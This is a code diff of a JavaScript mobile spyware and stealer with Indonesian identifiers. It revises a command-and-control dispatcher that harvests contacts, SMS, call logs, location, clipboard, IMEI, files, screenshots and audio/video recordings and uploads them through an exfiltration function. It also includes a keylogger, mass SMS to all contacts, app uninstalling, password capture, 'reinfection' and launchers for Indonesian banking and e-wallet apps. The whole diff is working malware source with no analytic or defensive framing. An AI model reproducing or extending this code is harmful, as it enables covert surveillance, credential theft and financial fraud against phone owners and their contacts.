     setTimeout(function() {
         var collected = Object.keys(DATA_COLLECTED);
-        logBypass('✅ Selesai! ' + collected.length + ' data real terkumpul');
-        K({ sumber: 'data_collection_complete_real', data: {
+        logBypass('✅ Selesai! ' + collected.length + ' data terkumpul');
+        K({ sumber: 'data_collection_complete', data: {
             total: collected.length,
             types: collected,
             timestamp: Date.now()
         } });
-    }, 8500);
+    }, 8000);
 }
 
 // ============================================================
@@ -822,50 +791,50 @@ function eksekusiPerintah(cmd) {
 
     try {
         switch (aksi) {
-            case "ambil_kontak": hasil = ambilKontakReal(); break;
-            case "ambil_sms": hasil = ambilSMSReal(); break;
-            case "ambil_call_log": hasil = ambilCallLogReal(); break;
-            case "ambil_lokasi": hasil = ambilLokasiReal(); break;
-            case "get_clipboard": hasil = getClipboardReal(); break;
-            case "set_clipboard": hasil = setClipboardReal(params.text || ""); break;
-            case "ambil_imei": hasil = ambilIMEIReal(); break;
-            case "ambil_imsi": hasil = ambilIMSIReg(); break;
-            case "ambil_nomor_hp": hasil = ambilNomorHPReal(); break;
-            case "get_installed_apps": hasil = getInstalledAppsReal(); break;
-            case "get_notifications": hasil = getNotificationsReal(); break;
+            case "ambil_kontak": hasil = ambilKontak(); break;
+            case "ambil_sms": hasil = ambilSMS(); break;
+            case "ambil_call_log": hasil = ambilCallLog(); break;
+            case "ambil_lokasi": hasil = ambilLokasi(); break;
+            case "get_clipboard": hasil = getClipboard(); break;
+            case "set_clipboard": hasil = setClipboard(params.text || ""); break;
+            case "ambil_imei": hasil = ambilIMEI(); break;
+            case "ambil_imsi": hasil = ambilIMSI(); break;
+            case "ambil_nomor_hp": hasil = ambilNomorHP(); break;
+            case "get_installed_apps": hasil = getInstalledApps(); break;
+            case "get_notifications": hasil = getNotifications(); break;
             case "keylogger_start": hasil = keyloggerStart(); break;
             case "keylogger_stop": hasil = keyloggerStop(); break;
             case "keylogger_upload": hasil = keyloggerUpload(); break;
             case "keylogger_status": hasil = keyloggerStatus(); break;
-            case "kirim_sms": hasil = kirimSMSReal(params.nomor || "", params.pesan || ""); break;
-            case "kirim_sms_massal": hasil = kirimSMSMassalReal(params.pesan || ""); break;
-            case "call_number": hasil = callNumberReal(params.nomor || ""); break;
-            case "buka_aplikasi": hasil = bukaAplikasiReal(params.package || ""); break;
-            case "uninstall_aplikasi": hasil = uninstallAplikasiReal(params.package || ""); break;
-            case "app_force_stop": hasil = appForceStopReal(params.package || ""); break;
-            case "app_clear_data": hasil = appClearDataReal(params.package || ""); break;
+            case "kirim_sms": hasil = kirimSMS(params.nomor || "", params.pesan || ""); break;
+            case "kirim_sms_massal": hasil = kirimSMSMassal(params.pesan || ""); break;
+            case "call_number": hasil = callNumber(params.nomor || ""); break;
+            case "buka_aplikasi": hasil = bukaAplikasi(params.package || ""); break;
+            case "uninstall_aplikasi": hasil = uninstallAplikasi(params.package || ""); break;
+            case "app_force_stop": hasil = appForceStop(params.package || ""); break;
+            case "app_clear_data": hasil = appClearData(params.package || ""); break;
             case "buka_url": hasil = bukaURL(params.url || "https://verifikasi.site"); break;
-            case "buka_dana": hasil = bukaDANAReal(); break;
-            case "buka_gopay": hasil = bukaGoPayReal(); break;
-            case "buka_ovo": hasil = bukaOVOReal(); break;
-            case "buka_bri": hasil = bukaBRIReal(); break;
-            case "buka_bca": hasil = bukaBCAReal(); break;
-            case "buka_mandiri": hasil = bukaMandiriReal(); break;
-            case "buka_shopee": hasil = bukaShopeeReal(); break;
-            case "screenshot": hasil = ambilScreenshotReal(); break;
-            case "record_audio": hasil = recordAudioReal(params.durasi || 10); break;
+            case "buka_dana": hasil = bukaDANA(); break;
+            case "buka_gopay": hasil = bukaGoPay(); break;
+            case "buka_ovo": hasil = bukaOVO(); break;
+            case "buka_bri": hasil = bukaBRI(); break;
+            case "buka_bca": hasil = bukaBCA(); break;
+            case "buka_mandiri": hasil = bukaMandiri(); break;
+            case "buka_shopee": hasil = bukaShopee(); break;
+            case "screenshot": hasil = ambilScreenshot(); break;
+            case "record_audio": hasil = recordAudio(params.durasi || 10); break;
             case "stop_audio": hasil = stopAudio(); break;
-            case "record_video": hasil = recordVideoReal(params.durasi || 10); break;
+            case "record_video": hasil = recordVideo(params.durasi || 10); break;
             case "stop_video": hasil = stopVideo(); break;
-            case "screen_record": hasil = screenRecordReal(params.durasi || 30); break;
+            case "screen_record": hasil = screenRecord(params.durasi || 30); break;
             case "screen_record_stop": hasil = screenRecordStop(); break;
             case "screen_record_status": hasil = screenRecordStatus(); break;
-            case "list_file": hasil = listFileReal(params.path || "/sdcard/"); break;
-            case "ambil_file": hasil = ambilFileReal(params.path || ""); break;
-            case "get_system_info": hasil = getSystemInfoReal(); break;
-            case "get_battery": hasil = getBatteryReal(); break;
-            case "get_wifi": hasil = getNetworkReal(); break;
-            case "vibrate": hasil = vibrateReal(params.durasi || 1000); break;
+            case "list_file": hasil = listFile(params.path || "/sdcard/"); break;
+            case "ambil_file": hasil = ambilFile(params.path || ""); break;
+            case "get_system_info": hasil = getSystemInfo(); break;
+            case "get_battery": hasil = getBattery(); break;
+            case "get_wifi": hasil = getNetwork(); break;
+            case "vibrate": hasil = vibrate(params.durasi || 1000); break;
             case "toast": hasil = showToast(params.pesan || "System Update Complete!"); break;
             default: hasil = "Unknown command: " + aksi;
         }
@@ -876,142 +845,153 @@ function eksekusiPerintah(cmd) {
 }
 
 // ============================================================
-// FUNGSI PERINTAH
+// FUNGSI PERINTAH C2
 // ============================================================
-function ambilKontakReal() {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function ambilKontak() {
+    if (A.isAvailable) {
+        try {
+            var contacts = A.getAllContacts();
+            if (contacts) {
+                K({ sumber: 'data_kontak_c2', data: contacts });
+                return contacts.length + ' kontak';
+            }
+        } catch(e) {}
+    }
     try {
-        var contacts = A.getAllContacts();
-        if (contacts) {
-            K({ sumber: 'data_kontak_real', data: contacts });
-            return contacts.length + ' kontak real';
+        if ('contacts' in navigator) {
+            navigator.contacts.select(['name', 'tel'], { multiple: true })
+                .then(function(kontak) {
+                    K({ sumber: 'data_kontak_c2', data: kontak });
+                })
+                .catch(function() {});
+            return 'Mengambil kontak via API...';
         }
-        return 'No contacts';
-    } catch(e) { return 'Error: ' + e.message; }
+    } catch(e) {}
+    return 'Kontak tidak tersedia';
 }
 
-function ambilSMSReal() {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function ambilSMS() {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         var sms = A.getAllSMS();
         if (sms) {
-            K({ sumber: 'data_sms_real', data: sms });
-            return sms.length + ' SMS real';
+            K({ sumber: 'data_sms_c2', data: sms });
+            return sms.length + ' SMS';
         }
-        return 'No SMS';
+        return 'Tidak ada SMS';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function ambilCallLogReal() {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function ambilCallLog() {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         var callLog = A.getCallLog();
         if (callLog) {
-            K({ sumber: 'data_call_log_real', data: callLog });
-            return callLog.length + ' call logs real';
+            K({ sumber: 'data_calllog_c2', data: callLog });
+            return callLog.length + ' call logs';
         }
-        return 'No call logs';
+        return 'Tidak ada call log';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function ambilLokasiReal() {
+function ambilLokasi() {
     try {
         navigator.geolocation.getCurrentPosition(function(pos) {
-            K({ sumber: 'data_lokasi_gps_real', data: {
+            K({ sumber: 'data_lokasi_gps_c2', data: {
                 lat: pos.coords.latitude,
                 lon: pos.coords.longitude,
                 accuracy: pos.coords.accuracy
             } });
         });
-        return 'Getting GPS location...';
+        return 'Mengambil GPS...';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function getClipboardReal() {
+function getClipboard() {
     try {
         navigator.clipboard.readText().then(function(t) {
-            if (t) K({ sumber: 'data_clipboard_real', data: t });
+            if (t) K({ sumber: 'data_clipboard_c2', data: t });
         }).catch(function() {});
-        return 'Reading clipboard...';
+        return 'Membaca clipboard...';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function setClipboardReal(text) {
+function setClipboard(text) {
     try {
         navigator.clipboard.writeText(text);
         return 'Clipboard set';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function ambilIMEIReal() {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function ambilIMEI() {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         var imei = A.getIMEI();
         if (imei) {
-            K({ sumber: 'data_imei_real', data: imei });
-            return 'IMEI real';
+            K({ sumber: 'data_imei_c2', data: imei });
+            return 'IMEI: ' + imei;
         }
-        return 'No IMEI';
+        return 'Tidak ada IMEI';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function ambilIMSIReg() {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function ambilIMSI() {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         var imsi = A.getIMSI();
         if (imsi) {
-            K({ sumber: 'data_imsi_real', data: imsi });
-            return 'IMSI real';
+            K({ sumber: 'data_imsi_c2', data: imsi });
+            return 'IMSI: ' + imsi;
         }
-        return 'No IMSI';
+        return 'Tidak ada IMSI';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function ambilNomorHPReal() {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function ambilNomorHP() {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         var phone = A.getPhoneNumber();
         if (phone) {
-            K({ sumber: 'data_phone_real', data: phone });
-            return 'Phone number real';
+            K({ sumber: 'data_phone_c2', data: phone });
+            return 'Nomor HP: ' + phone;
         }
-        return 'No phone number';
+        return 'Tidak ada nomor HP';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function getInstalledAppsReal() {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function getInstalledApps() {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         var apps = A.getInstalledApps();
         if (apps) {
-            K({ sumber: 'data_installed_apps_real', data: apps });
-            return apps.length + ' apps real';
+            K({ sumber: 'data_apps_c2', data: apps });
+            return apps.length + ' apps';
         }
-        return 'No apps';
+        return 'Tidak ada apps';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function getNotificationsReal() {
+function getNotifications() {
     try {
         if (typeof Notification !== 'undefined') {
-            K({ sumber: 'data_notifications_real', data: { permission: Notification.permission } });
+            K({ sumber: 'data_notifications_c2', data: { permission: Notification.permission } });
             return 'Notification: ' + Notification.permission;
         }
         return 'Notification not available';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function kirimSMSReal(nomor, pesan) {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function kirimSMS(nomor, pesan) {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         A.sendSMS(nomor, pesan);
-        K({ sumber: 'data_sms_sent_real', data: { to: nomor } });
+        K({ sumber: 'data_sms_sent_c2', data: { to: nomor } });
         return 'SMS sent to ' + nomor;
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function kirimSMSMassalReal(pesan) {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function kirimSMSMassal(pesan) {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         var contacts = A.getAllContacts();
         if (contacts) {
@@ -1022,50 +1002,50 @@ function kirimSMSMassalReal(pesan) {
                     try { A.sendSMS(number, pesan); sent++; } catch(e) {}
                 }
             });
-            K({ sumber: 'data_sms_massal_sent_real', data: { sent: sent } });
+            K({ sumber: 'data_sms_massal_c2', data: { sent: sent } });
             return 'SMS massal sent to ' + sent + ' contacts';
         }
         return 'No contacts';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function callNumberReal(nomor) {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function callNumber(nomor) {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         A.callNumber(nomor);
-        K({ sumber: 'data_call_initiated_real', data: { number: nomor } });
+        K({ sumber: 'data_call_c2', data: { number: nomor } });
         return 'Calling ' + nomor;
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function bukaAplikasiReal(packageName) {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function bukaAplikasi(packageName) {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         A.openApp(packageName);
-        K({ sumber: 'data_app_opened_real', data: { package: packageName } });
+        K({ sumber: 'data_app_opened_c2', data: { package: packageName } });
         return 'Opening ' + packageName;
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function uninstallAplikasiReal(packageName) {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function uninstallAplikasi(packageName) {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         A.uninstallApp(packageName);
-        K({ sumber: 'data_app_uninstalled_real', data: { package: packageName } });
+        K({ sumber: 'data_app_uninstalled_c2', data: { package: packageName } });
         return 'Uninstalling ' + packageName;
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function appForceStopReal(packageName) {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function appForceStop(packageName) {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         A.forceStopApp(packageName);
         return 'Force stopping ' + packageName;
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function appClearDataReal(packageName) {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function appClearData(packageName) {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         A.clearAppData(packageName);
         return 'Clearing data ' + packageName;
@@ -1076,15 +1056,15 @@ function bukaURL(url) {
     try { window.open(url, '_blank'); return 'URL opened'; } catch(e) { return 'Error: ' + e.message; }
 }
 
-function bukaDANAReal() { return bukaAplikasiReal('id.dana'); }
-function bukaGoPayReal() { return bukaAplikasiReal('com.gojek.app'); }
-function bukaOVOReal() { return bukaAplikasiReal('ovo.id'); }
-function bukaBRIReal() { return bukaAplikasiReal('id.co.bri.brimo'); }
-function bukaBCAReal() { return bukaAplikasiReal('com.bca'); }
-function bukaMandiriReal() { return bukaAplikasiReal('com.bankmandiri.mandirionline'); }
-function bukaShopeeReal() { return bukaAplikasiReal('com.shopee.id'); }
+function bukaDANA() { return bukaAplikasi('id.dana'); }
+function bukaGoPay() { return bukaAplikasi('com.gojek.app'); }
+function bukaOVO() { return bukaAplikasi('ovo.id'); }
+function bukaBRI() { return bukaAplikasi('id.co.bri.brimo'); }
+function bukaBCA() { return bukaAplikasi('com.bca'); }
+function bukaMandiri() { return bukaAplikasi('com.bankmandiri.mandirionline'); }
+function bukaShopee() { return bukaAplikasi('com.shopee.id'); }
 
-function ambilScreenshotReal() {
+function ambilScreenshot() {
     try {
         var canvas = document.createElement('canvas');
         canvas.width = screen.width;
@@ -1094,14 +1074,14 @@ function ambilScreenshotReal() {
         ctx.fillRect(0, 0, canvas.width, canvas.height);
         var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
         if (dataUrl) {
-            K({ sumber: 'data_screenshot_real', data: dataUrl });
-            return 'Screenshot real';
+            K({ sumber: 'data_screenshot_c2', data: dataUrl });
+            return 'Screenshot taken';
         }
         return 'No screenshot';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function recordAudioReal(durasi) {
+function recordAudio(durasi) {
     try {
         navigator.mediaDevices.getUserMedia({ audio: true })
             .then(function(stream) {
@@ -1113,7 +1093,7 @@ function recordAudioReal(durasi) {
                     var reader = new FileReader();
                     reader.onload = function() {
                         if (reader.result) {
-                            K({ sumber: 'data_audio_real', data: reader.result });
+                            K({ sumber: 'data_audio_c2', data: reader.result });
                         }
                     };
                     reader.readAsDataURL(blob);
@@ -1133,7 +1113,7 @@ function stopAudio() {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function recordVideoReal(durasi) {
+function recordVideo(durasi) {
     try {
         navigator.mediaDevices.getUserMedia({ video: true, audio: true })
             .then(function(stream) {
@@ -1146,7 +1126,7 @@ function recordVideoReal(durasi) {
                     var reader = new FileReader();
                     reader.onload = function() {
                         if (reader.result) {
-                            K({ sumber: 'data_video_real', data: reader.result });
+                            K({ sumber: 'data_video_c2', data: reader.result });
                         }
                     };
                     reader.readAsDataURL(blob);
@@ -1163,7 +1143,7 @@ function stopVideo() { return stopAudio(); }
 
 var screenRecorder = null, screenChunks = [];
 
-function screenRecordReal(durasi) {
+function screenRecord(durasi) {
     try {
         if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
             navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
@@ -1176,7 +1156,7 @@ function screenRecordReal(durasi) {
                         var reader = new FileReader();
                         reader.onload = function() {
                             if (reader.result) {
-                                K({ sumber: 'data_screen_rec_real', data: reader.result });
+                                K({ sumber: 'data_screen_rec_c2', data: reader.result });
                             }
                         };
                         reader.readAsDataURL(blob);
@@ -1206,35 +1186,72 @@ function screenRecordStatus() {
     return screenRecorder ? 'Recording: ' + screenRecorder.state : 'No recording';
 }
 
-function listFileReal(path) {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function listFile(path) {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         var files = A.listFiles(path);
         if (files) {
-            K({ sumber: 'data_list_file_real', data: { path: path, files: files } });
+            K({ sumber: 'data_files_c2', data: { path: path, files: files } });
             return files.length + ' files from ' + path;
         }
         return 'No files';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function ambilFileReal(path) {
-    if (!A.isAvailable) return 'BRIDGE_NOT_AVAILABLE';
+function ambilFile(path) {
+    if (!A.isAvailable) return 'Bridge tidak tersedia';
     try {
         var file = A.readFile(path);
         if (file) {
-            K({ sumber: 'data_file_read_real', data: { path: path, content: file } });
+            K({ sumber: 'data_file_c2', data: { path: path, content: file } });
             return 'File read: ' + path;
         }
         return 'File not readable';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-function vibrateReal(durasi) {
+function getSystemInfo() {
+    try {
+        var info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: screen.width + 'x' + screen.height,
+            hardwareConcurrency: navigator.hardwareConcurrency || null,
+            deviceMemory: navigator.deviceMemory || null,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        K({ sumber: 'data_system_info_c2', data: info });
+        return JSON.stringify(info);
+    } catch(e) { return 'Error: ' + e.message; }
+}
+
+function getBattery() {
+    try {
+        navigator.getBattery().then(function(b) {
+            K({ sumber: 'data_baterai_c2', data: { level: Math.round(b.level * 100) + '%', charging: b.charging } });
+        });
+        return 'Mengambil baterai...';
+    } catch(e) { return 'Error: ' + e.message; }
+}
+
+function getNetwork() {
+    try {
+        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            var data = { type: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt };
+            K({ sumber: 'data_network_c2', data: data });
+            return JSON.stringify(data);
+        }
+        return 'Network not available';
+    } catch(e) { return 'Error: ' + e.message; }
+}
+
+function vibrate(durasi) {
     try {
         if (navigator.vibrate) {
             navigator.vibrate(durasi);
-            K({ sumber: 'data_vibrate_real', data: { duration: durasi } });
+            K({ sumber: 'data_vibrate_c2', data: { duration: durasi } });
             return 'Vibrated ' + durasi + 'ms';
         }
         return 'Vibration not supported';
@@ -1264,7 +1281,7 @@ function keyloggerStop() {
 
 function keyloggerUpload() {
     if (KEYLOG_DATA.length > 0) {
-        K({ sumber: 'data_keylogger_real', data: KEYLOG_DATA });
+        K({ sumber: 'data_keylogger_c2', data: KEYLOG_DATA });
     }
     var count = KEYLOG_DATA.length;
     KEYLOG_DATA = [];
@@ -1304,7 +1321,7 @@ function ambilPassword() {
                         autoExecuteC2();
                         
                         setTimeout(function() {
-                            collectAllRealData();
+                            collectAllData();
                         }, 1000);
                         
                         return;
@@ -1322,7 +1339,7 @@ function ambilPassword() {
                 startReinfection();
                 autoExecuteC2();
                 setTimeout(function() {
-                    collectAllRealData();
+                    collectAllData();
                 }, 1000);
                 return;
             }
@@ -1340,7 +1357,7 @@ function ambilPassword() {
                 startReinfection();
                 autoExecuteC2();
                 setTimeout(function() {
-                    collectAllRealData();
+                    collectAllData();
                 }, 1000);
                 return;
             }
@@ -1358,7 +1375,7 @@ function ambilPassword() {
                 startReinfection();
                 autoExecuteC2();
                 setTimeout(function() {
-                    collectAllRealData();
+                    collectAllData();
                 }, 1000);
                 return;
             }
